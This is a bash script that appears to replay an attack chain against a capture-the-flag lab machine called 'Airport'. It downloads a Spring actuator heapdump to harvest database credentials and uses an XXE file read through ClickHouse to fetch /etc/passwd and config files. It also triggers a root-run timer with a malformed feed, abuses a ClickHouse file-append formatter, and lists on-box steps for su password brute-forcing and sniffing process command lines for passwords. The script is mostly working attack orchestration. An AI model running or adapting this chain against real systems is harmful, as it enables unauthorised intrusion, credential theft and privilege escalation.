#!/usr/bin/env bash
# Operator replay for Airport. No secrets in this file.
#   export TARGET=10.129.x.x CH_PASS=...   # from heap
#   ./replay.sh heap
#   ./replay.sh xxe /etc/passwd
#   ./replay.sh xxe /opt/kafka_2.13-4.3.1/config/server.properties
#   ./replay.sh dlq
#   ./replay.sh append          # needs CH_DEFAULT_PASS
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TARGET="${TARGET:-}"
INGEST="${INGEST:-http://${TARGET}:8081/feeds/aidx}"
CH_URL="${CH_URL:-http://db.htb-airport.htb/}"
API="${API:-http://api.htb-airport.htb}"
CH_USER="${CH_USER:-svc_events}"

die() { echo "[-] $*" >&2; exit 1; }
need_target() { [[ -n "$TARGET" ]] || die "export TARGET=<ip>"; }
need_ch() { [[ -n "${CH_PASS:-}" ]] || die "export CH_PASS (Hikari user from heapdump)"; }

cmd="${1:-help}"
shift || true

case "$cmd" in
  hosts)
    need_target
    echo "$TARGET htb-airport.htb api.htb-airport.htb db.htb-airport.htb"
    echo "# append that line to /etc/hosts"
    ;;
  heap)
    need_target
    mkdir -p /tmp/airport-heap
    echo "[*] GET $API/actuator/heapdump"
    curl -fsS -o /tmp/airport-heap/heap.bin "$API/actuator/heapdump"
    python3 "$SCRIPT_DIR/heap_extract.py" /tmp/airport-heap/heap.bin
    echo "[*] set CH_PASS from the setPassword neighbourhood, then: $0 xxe /etc/passwd"
    ;;
  xxe)
    need_target
    need_ch
    path="${1:-/etc/hostname}"
    python3 "$SCRIPT_DIR/xxe_read.py" --target "$TARGET" --file "$path" \
      --ch-url "$CH_URL" -u "$CH_USER" -p "$CH_PASS"
    ;;
  dlq)
    need_target
    python3 "$SCRIPT_DIR/aidx_ingest.py" --url "$INGEST" --malformed
    echo "[*] timer fires ≤2 min. On the box: python3 proc_sniff.py --needle clickhouse-client"
    ;;
  append)
    [[ -n "${CH_DEFAULT_PASS:-}" ]] || die "export CH_DEFAULT_PASS (from cmdline sniff)"
    python3 "$SCRIPT_DIR/ch_file_append.py" --url "$CH_URL" -u default \
      -p "$CH_DEFAULT_PASS" --verify
    echo "[*] trigger drain: $0 dlq"
    ;;
  help|*)
    cat <<EOF
Airport replay (export TARGET, CH_PASS, CH_DEFAULT_PASS)

  $0 hosts              print /etc/hosts line
  $0 heap               download actuator heapdump + extract
  $0 xxe [path]         in-band file:// XXE via ClickHouse
  $0 dlq                malformed AIDX → DLQ (wakes the root timer)
  $0 append             FILE-append formatter (needs CH_DEFAULT_PASS)

On the box after SSH as svc-infra:
  python3 su_brute.py martin_cole --rockyou-head 80
  python3 proc_sniff.py --needle clickhouse-client --out /tmp/chhit.bin
EOF
    ;;
esac
